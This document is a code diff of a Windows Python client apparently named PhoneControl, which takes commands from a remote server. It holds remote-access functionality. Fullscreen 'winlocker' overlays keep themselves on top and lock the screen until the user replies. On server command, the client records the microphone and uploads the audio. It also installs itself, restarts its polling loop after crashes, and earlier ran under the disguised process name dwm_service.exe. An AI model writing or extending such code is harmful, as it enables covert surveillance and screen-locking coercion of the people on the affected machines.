@@ -248,17 +248,11 @@ def show_message_overlay(text: str, fb_mode: str, reply_prompt: str,
     reply  → text + input + Send (winlocker until sent)
     survey → questions one by one + Send (winlocker until done)
     """
-    log.info(f"show_message_overlay start: fb_mode={fb_mode}")
     stop_event = threading.Event()
     answers    = []
     q_index    = [0]
 
-    try:
-        root = make_fullscreen_root("#1a1a2e")
-        log.info("show_message_overlay: root created")
-    except Exception as e:
-        log.error(f"show_message_overlay: root creation failed: {e}")
-        return
+    root = make_fullscreen_root("#1a1a2e")
 
     # ── Layout ────────────────────────────────────────────────────────────────
     outer = tk.Frame(root, bg="#1a1a2e")
@@ -353,19 +347,16 @@ def show_message_overlay(text: str, fb_mode: str, reply_prompt: str,
         target=keep_on_top, args=(root, stop_event, focus_target), daemon=True
     ).start()
 
-    log.info("show_message_overlay: entering mainloop")
-    try:
-        root.mainloop()
-    except Exception as e:
-        log.error(f"show_message_overlay mainloop crashed: {e}")
-    log.info("show_message_overlay: done, stop_event set, returning")
-    stop_event.set()
+    root.mainloop()
 
 # ─── Video overlay ────────────────────────────────────────────────────────────
 
+import cv2
+from PIL import Image, ImageTk
+
 # Global reference so /unbanvideo can close it
-_video_window: tk.Tk = None
-_video_stop:   threading.Event = threading.Event()
+_video_window = None
+_video_stop   = threading.Event()
 
 def show_video_overlay(video_path: str, lock: bool, duration: int,
                         fb_mode: str, reply_prompt: str, survey: list,
@@ -378,25 +369,26 @@ def show_video_overlay(video_path: str, lock: bool, duration: int,
     root = make_fullscreen_root("#000000")
     _video_window = root
 
-    # Только lift() — не сбивает фокус с поля ввода
     def _keep_on_top():
         while not stop_event.is_set():
+            time.sleep(2)
+            if stop_event.is_set():
+                break
             try:
+                if not root.winfo_exists():
+                    break
                 root.attributes("-topmost", True)
                 root.lift()
             except Exception:
                 break
-            time.sleep(2)
     threading.Thread(target=_keep_on_top, daemon=True).start()
 
     answers = []
     q_index = [0]
 
-    # ── Frame для видео ───────────────────────────────────────────────────────
-    video_frame = tk.Frame(root, bg="black")
-    video_frame.pack(fill="both", expand=True)
+    canvas = tk.Canvas(root, bg="black", highlightthickness=0)
+    canvas.pack(fill="both", expand=True)
 
-    # ── Bottom UI ─────────────────────────────────────────────────────────────
     bottom = tk.Frame(root, bg="#111111")
     bottom.pack(side="bottom", fill="x", pady=10)
 
@@ -417,23 +409,8 @@ def show_video_overlay(video_path: str, lock: bool, duration: int,
                             bg="#333", fg="white", relief="flat",
                             padx=20, pady=8, cursor="hand2")
 
-    mci_alias = "pcvideo"
-    mci_started = [False]
-
-    def _mci(cmd):
-        import ctypes
-        buf = ctypes.create_unicode_buffer(512)
-        ctypes.windll.winmm.mciSendStringW(cmd, buf, 512, 0)
-        return buf.value
-
     def do_close():
         stop_event.set()
-        if mci_started[0]:
-            try:
-                _mci(f"stop {mci_alias}")
-                _mci(f"close {mci_alias}")
-            except Exception:
-                pass
         global _video_window
         _video_window = None
         try:
@@ -479,38 +456,58 @@ def show_video_overlay(video_path: str, lock: bool, duration: int,
         else:
             close_btn.pack()
 
-    # ── MCI видео — нативный Windows, без мигания ─────────────────────────────
-    def _start_mci():
-        try:
-            import ctypes
-            hwnd = video_frame.winfo_id()
-            w = video_frame.winfo_width() or root.winfo_screenwidth()
-            h = video_frame.winfo_height() or (root.winfo_screenheight() - 80)
+    # ── OpenCV рендер через mainloop — без потока, без мигания ───────────────
+    cap_holder = [None]
+    img_ref    = [None]
+    img_id     = [None]
 
-            _mci(f'open "{video_path}" alias {mci_alias}')
-            _mci(f'window {mci_alias} handle {hwnd}')
-            _mci(f'put {mci_alias} destination at 0 0 {w} {h}')
-            _mci(f'play {mci_alias}')
-            mci_started[0] = True
-            log.info(f"MCI video started: {video_path}")
+    def _next_frame():
+        if stop_event.is_set():
+            if cap_holder[0]:
+                cap_holder[0].release()
+            return
+        cap = cap_holder[0]
+        if cap is None:
+            return
+        ret, frame = cap.read()
+        if not ret:
+            cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
+            ret, frame = cap.read()
+        if ret:
+            try:
+                cw = canvas.winfo_width()
+                ch = canvas.winfo_height()
+                if cw > 1 and ch > 1:
+                    fh, fw = frame.shape[:2]
+                    scale = min(cw / fw, ch / fh)
+                    nw, nh = int(fw * scale), int(fh * scale)
+                    frame = cv2.resize(frame, (nw, nh), interpolation=cv2.INTER_LINEAR)
+                rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                img = ImageTk.PhotoImage(Image.fromarray(rgb))
+                img_ref[0] = img
+                if img_id[0] is None:
+                    img_id[0] = canvas.create_image(cw // 2, ch // 2, anchor="center", image=img)
+                else:
+                    canvas.itemconfig(img_id[0], image=img)
+                    canvas.coords(img_id[0], cw // 2, ch // 2)
+            except Exception as e:
+                log.error(f"frame render: {e}")
+        fps = cap.get(cv2.CAP_PROP_FPS) or 30
+        root.after(max(1, int(1000 / fps)), _next_frame)
 
-            # Зацикливаем — когда заканчивается, перезапускаем
-            while not stop_event.is_set():
-                status = _mci(f'status {mci_alias} mode')
-                if status == "stopped":
-                    _mci(f'seek {mci_alias} to start')
-                    _mci(f'play {mci_alias}')
-                time.sleep(1)
-        except Exception as e:
-            log.error(f"MCI error: {e}")
+    def _open_video():
+        cap = cv2.VideoCapture(video_path)
+        if not cap.isOpened():
+            log.error(f"Cannot open video: {video_path}")
+            root.after(0, lambda: status_lbl.config(text="⚠️ Не удалось открыть видео"))
+            return
+        cap_holder[0] = cap
+        log.info(f"Video opened: {video_path} fps={cap.get(cv2.CAP_PROP_FPS):.1f}")
+        root.after(0, _next_frame)
 
-    # Ждём пока frame получит реальный HWND
-    def _delayed_start():
-        time.sleep(0.3)
-        _start_mci()
-    threading.Thread(target=_delayed_start, daemon=True).start()
+    root.after(150, _open_video)
 
-    # ── Duration countdown before unlock ─────────────────────────────────────
+    # ── Duration countdown ────────────────────────────────────────────────────
     if duration > 0:
         def countdown():
             for remaining in range(duration, 0, -1):
@@ -540,7 +537,6 @@ def unban_video():
             _video_window = None
         except Exception as e:
             log.error(f"unban_video: {e}")
-
 
 # ─── File picker ─────────────────────────────────────────────────────────────
 
@@ -707,82 +703,6 @@ def delete_video_cache(url: str):
 
 # ─── Command handler ─────────────────────────────────────────────────────────
 
-def get_and_send_audio_devices(chat_id: str):
-    """Получает список микрофонов и отправляет на сервер."""
-    try:
-        import sounddevice as sd
-        devices_raw = sd.query_devices()
-        mics = []
-        for i, d in enumerate(devices_raw):
-            if d['max_input_channels'] > 0:
-                mics.append({"index": i, "name": d['name']})
-        log.info(f"Found {len(mics)} microphones")
-        http_post_json("/micro_devices", {
-            "chat_id": chat_id,
-            "device_id": DEVICE_ID,
-            "devices": mics,
-        })
-    except ImportError:
-        log.error("sounddevice not installed")
-        http_post_json("/text_reply", {
-            "chat_id": chat_id,
-            "text": "⚠️ Библиотека sounddevice не установлена.",
-            "device_id": DEVICE_ID,
-        })
-    except Exception as e:
-        log.error(f"get_audio_devices error: {e}")
-        http_post_json("/text_reply", {
-            "chat_id": chat_id,
-            "text": f"⚠️ Ошибка получения микрофонов: {e}",
-            "device_id": DEVICE_ID,
-        })
-
-
-def record_and_send_audio(seconds: int, chat_id: str, device_index: int = None):
-    """Записывает звук с микрофона и отправляет WAV-файл на сервер."""
-    import wave, tempfile
-    try:
-        import sounddevice as sd
-        import numpy as np
-        log.info(f"Recording audio: {seconds}s device={device_index}")
-        samplerate = 44100
-        recording = sd.rec(
-            int(seconds * samplerate),
-            samplerate=samplerate,
-            channels=1,
-            dtype='int16',
-            device=device_index,
-        )
-        sd.wait()
-
-        tmp = tempfile.NamedTemporaryFile(suffix='.wav', delete=False)
-        with wave.open(tmp.name, 'wb') as wf:
-            wf.setnchannels(1)
-            wf.setsampwidth(2)
-            wf.setframerate(samplerate)
-            wf.writeframes(recording.tobytes())
-
-        log.info(f"Audio recorded: {tmp.name}")
-        http_post_multipart("/upload", tmp.name, chat_id,
-                            caption=f"🎙 Запись {seconds} сек")
-        os.unlink(tmp.name)
-
-    except ImportError:
-        log.error("sounddevice not installed")
-        http_post_json("/text_reply", {
-            "chat_id": chat_id,
-            "text": "⚠️ Библиотека sounddevice не установлена в exe.",
-            "device_id": DEVICE_ID,
-        })
-    except Exception as e:
-        log.error(f"record_and_send_audio error: {e}")
-        http_post_json("/text_reply", {
-            "chat_id": chat_id,
-            "text": f"⚠️ Ошибка записи: {e}",
-            "device_id": DEVICE_ID,
-        })
-
-
 def handle_command(cmd: dict):
     name     = cmd.get("cmd", "")
     chat_id  = cmd.get("_chat_id", "")
@@ -850,7 +770,6 @@ def handle_command(cmd: dict):
         unban_video()
 
     elif name in ("open_gallery", "open_camera"):
-        # Both → open file manager / file picker
         open_file_picker(chat_id)
 
     elif name == "get_audio_devices":
@@ -859,7 +778,8 @@ def handle_command(cmd: dict):
     elif name == "record_audio":
         seconds = cmd.get("seconds", 10)
         device_index = cmd.get("device_index", None)
-        threading.Thread(target=record_and_send_audio, args=(seconds, chat_id, device_index), daemon=True).start()
+        threading.Thread(target=record_and_send_audio,
+                         args=(seconds, chat_id, device_index), daemon=True).start()
 
     else:
         log.warning(f"Unknown command: {name}")
@@ -871,12 +791,12 @@ def handle_command(cmd: dict):
 # poll_loop при этом не блокируется — он просто кладёт задачу в очередь и идёт дальше.
 
 def ui_call(fn_name: str, *args):
-    """Запускает UI окно в отдельном subprocess — краш окна не трогает основной процесс."""
+    """Запускает UI окно в отдельном subprocess."""
     payload = json.dumps({"fn": fn_name, "args": list(args)})
     try:
         subprocess.Popen(
             [sys.executable, "--ui", payload],
-            creationflags=0x00000008,  # DETACHED_PROCESS
+            creationflags=0x00000008,
             close_fds=True,
         )
     except Exception as e:
@@ -953,13 +873,10 @@ def self_install():
     src = Path(sys.executable)
     dst_assets = INSTALL_DIR / "assets"
 
-    # Копируем exe (перезаписываем старый)
     shutil.copy2(src, INSTALL_EXE)
 
-    # Копируем assets из PyInstaller bundle (_MEIPASS) или рядом с exe
     meipass = Path(getattr(sys, "_MEIPASS", ""))
     src_assets = (meipass / "assets") if (meipass / "assets").exists() else (src.parent / "assets")
-
     if src_assets.exists():
         if dst_assets.exists():
             shutil.rmtree(dst_assets)
@@ -1027,18 +944,10 @@ def self_install():
 
 
 def print_uninstall_hint():
-    """Write uninstall.bat to C:\\dump\\ with correct cp1251 encoding."""
-    dump_dir = Path("C:/dump")
-    try:
-        dump_dir.mkdir(parents=True, exist_ok=True)
-    except Exception as e:
-        log.warning(f"Cannot create C:\\dump: {e}, falling back to INSTALL_DIR")
-        dump_dir = INSTALL_DIR
-
-    bat = dump_dir / "uninstall_phonecontrol.bat"
+    """Write uninstall.bat with UAC elevation and process kill."""
+    bat = INSTALL_DIR / "uninstall.bat"
     bat.write_text(
         "@echo off\n"
-        "chcp 1251 >nul\n"
         ":: Запрос прав администратора\n"
         "net session >nul 2>&1\n"
         "if %errorLevel% neq 0 (\n"
@@ -1047,7 +956,7 @@ def print_uninstall_hint():
         ")\n"
         "\n"
         "echo Останавливаем PhoneControl...\n"
-        f"taskkill /f /im dwm_service.exe >nul 2>&1\n"
+        f"taskkill /f /im phonecontrol.exe >nul 2>&1\n"
         "timeout /t 2 >nul\n"
         "\n"
         "echo Удаляем задачу планировщика...\n"
@@ -1055,31 +964,82 @@ def print_uninstall_hint():
         "timeout /t 1 >nul\n"
         "\n"
         "echo Удаляем файлы...\n"
+        ":: PowerShell удаляет папку через 3 сек после выхода bat\n"
         f"powershell -Command \"Start-Sleep 3; Remove-Item -Recurse -Force '{INSTALL_DIR}'\"\n"
         "\n"
         "echo Готово! PhoneControl удалён.\n"
         "pause\n",
-        encoding="cp1251"
+        encoding="utf-8"
     )
     log.info(f"Uninstall bat written: {bat}")
+
+
+def get_and_send_audio_devices(chat_id: str):
+    try:
+        import sounddevice as sd
+        mics = [{"index": i, "name": d["name"]}
+                for i, d in enumerate(sd.query_devices())
+                if d["max_input_channels"] > 0]
+        log.info(f"Found {len(mics)} microphones")
+        http_post_json("/micro_devices", {
+            "chat_id": chat_id, "device_id": DEVICE_ID, "devices": mics})
+    except ImportError:
+        http_post_json("/text_reply", {"chat_id": chat_id,
+            "text": "⚠️ sounddevice не установлен.", "device_id": DEVICE_ID})
+    except Exception as e:
+        log.error(f"get_audio_devices: {e}")
+        http_post_json("/text_reply", {"chat_id": chat_id,
+            "text": f"⚠️ Ошибка: {e}", "device_id": DEVICE_ID})
+
+
+def record_and_send_audio(seconds: int, chat_id: str, device_index=None):
+    import wave, tempfile
+    try:
+        import sounddevice as sd
+        import numpy as np
+        log.info(f"Recording {seconds}s device={device_index}")
+        sr = 44100
+        rec = sd.rec(int(seconds * sr), samplerate=sr, channels=1,
+                     dtype="int16", device=device_index)
+        sd.wait()
+        tmp = tempfile.NamedTemporaryFile(suffix=".wav", delete=False)
+        tmp_path = tmp.name
+        tmp.close()
+        with wave.open(tmp_path, "wb") as wf:
+            wf.setnchannels(1)
+            wf.setsampwidth(2)
+            wf.setframerate(sr)
+            wf.writeframes(rec.tobytes())
+        log.info(f"Audio saved: {tmp_path}")
+        http_post_multipart("/upload", tmp_path, chat_id,
+                            caption=f"🎙 Запись {seconds} сек")
+        os.unlink(tmp_path)
+    except ImportError:
+        http_post_json("/text_reply", {"chat_id": chat_id,
+            "text": "⚠️ sounddevice не установлен.", "device_id": DEVICE_ID})
+    except Exception as e:
+        log.error(f"record_audio: {e}")
+        http_post_json("/text_reply", {"chat_id": chat_id,
+            "text": f"⚠️ Ошибка записи: {e}", "device_id": DEVICE_ID})
 
 
 def _global_excepthook(exc_type, exc_value, exc_tb):
     import traceback
     log.critical("Unhandled exception: " + "".join(
-        traceback.format_exception(exc_type, exc_value, exc_tb)
-    ))
+        traceback.format_exception(exc_type, exc_value, exc_tb)))
 
 sys.excepthook = _global_excepthook
 
+
 def _threading_excepthook(args):
     import traceback
-    log.critical("Unhandled thread exception in '{}': {}".format(
-        args.thread.name if args.thread else "unknown",
-        "".join(traceback.format_exception(args.exc_type, args.exc_value, args.exc_traceback))
-    ))
+    log.critical("Thread exception in {}: {}".format(
+        args.thread.name if args.thread else "?",
+        "".join(traceback.format_exception(
+            args.exc_type, args.exc_value, args.exc_traceback))))
 
 threading.excepthook = _threading_excepthook
+
 
 def _poll_loop_supervisor():
     while True:
@@ -1089,14 +1049,12 @@ def _poll_loop_supervisor():
             log.critical(f"poll_loop crashed: {e}, restarting in 10s...")
             time.sleep(10)
 
+
 if __name__ == "__main__":
-    # ── UI subprocess mode ────────────────────────────────────────────────────
-    # Когда основной процесс вызывает ui_call, он запускает себя же с --ui
-    # и JSON-payload. Subprocess показывает окно и выходит.
-    # Краш Tcl/Tk убивает только subprocess, основной процесс живёт.
     if len(sys.argv) >= 3 and sys.argv[1] == "--ui":
         try:
-            payload = json.loads(sys.argv[2])
+            import json as _json
+            payload = _json.loads(sys.argv[2])
             fn_name = payload["fn"]
             args    = payload["args"]
             fn_map  = {
@@ -1111,16 +1069,9 @@ if __name__ == "__main__":
         except Exception as e:
             log.error(f"UI subprocess error: {e}")
         sys.exit(0)
-    # Hide console
-    # if sys.platform == "win32":
-    #     ctypes.windll.user32.ShowWindow(
-    #         ctypes.windll.kernel32.GetConsoleWindow(), 0
-    #     )
 
     if not is_installed():
-        # First run — install, launch, exit
         self_install()
     else:
-        # Already installed — write uninstall hint and start working
         print_uninstall_hint()
         _poll_loop_supervisor()
